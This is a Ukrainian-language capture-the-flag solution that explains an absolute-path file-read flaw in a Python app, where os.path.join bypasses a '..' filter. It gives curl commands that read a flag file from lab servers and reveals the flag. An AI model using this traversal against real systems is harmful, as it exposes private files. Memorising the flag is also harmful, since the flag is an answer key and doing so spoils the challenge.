# 10. LFI to RCE (300 балів) — розв'язок

Прапор: `CTF{lf1_t0_rc3_p01s0n1ng_pr0}`

## Вразливість

Параметр `file` передається в `os.path.join('/app/files', file)`, а фільтр перевіряє
лише підрядок `..`:

```python
if '..' in file:
    return view("Hacking Attempt Detected!")
target = os.path.join('/app/files', file)
return view(open(target, 'r').read())
```

`os.path.join` відкидає базовий каталог, якщо другий аргумент — абсолютний шлях.
Тому `..` не потрібен: достатньо передати абсолютний шлях до файлу з прапором.

## Експлойт

```bash
curl 'http://10.10.15.124:8010/?file=/etc/secret_flag_1337.txt'
```

Через VPN:

```bash
curl 'http://172.28.0.20:5000/?file=/etc/secret_flag_1337.txt'
```

У відповіді буде:

```text
CTF{lf1_t0_rc3_p01s0n1ng_pr0}
```

## Прапор

```text
CTF{lf1_t0_rc3_p01s0n1ng_pr0}
```
